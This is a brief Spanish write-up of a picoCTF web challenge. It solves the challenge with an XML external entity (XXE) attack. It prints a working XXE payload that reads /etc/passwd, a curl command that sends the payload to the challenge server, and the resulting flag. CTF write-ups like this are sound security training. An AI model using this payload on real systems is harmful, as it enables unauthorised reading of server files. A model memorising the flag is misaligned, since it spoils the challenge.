
**Reto:**
-Utilizar un xxe para entrar a una carpeta y obtener la bandera.

**Descripción:**
-The web project was rushed and no security assessment was done. Can you read the /etc/passwd 
  file?[Web Portal](http://saturn.picoctf.net:55708/)

**Solución:**
Aprovechar una deficiencia en el método POST para ingresar un xml que regresa la carpeta '/etc/passwd' y encontrar la bandera.
-Abrir la página.
-Presiona las teclas "Ctrl+Shift+i" para abrir las herramientas de desarrollador.
-Revisar los métodos de request para verificar que hay un xml.
-Crear un archivo llamado 'payload.xml' y escribir el siguiente texto.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data>
  <ID>
    &xxe;
  </ID>
</data>
```
-Guardar el archivo y ejecutar el siguiente comando.
```
curl -X POST http://saturn.picoctf.net:65146/data  \
     -H "Content-Type: application/xml" \
     --data-binary @payload.xml |
     grep 'pico'
```
-Una vez ejecutado este comando, la bandera aparecerá en la terminal.

El resultado es: **picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}**.

**Notas adicionales:**
-Es posible editar el request con BurpSuite.

**Referencias:**
http://saturn.picoctf.net:55708/
https://blog.hackmetrix.com/xxe-xml-external-entity/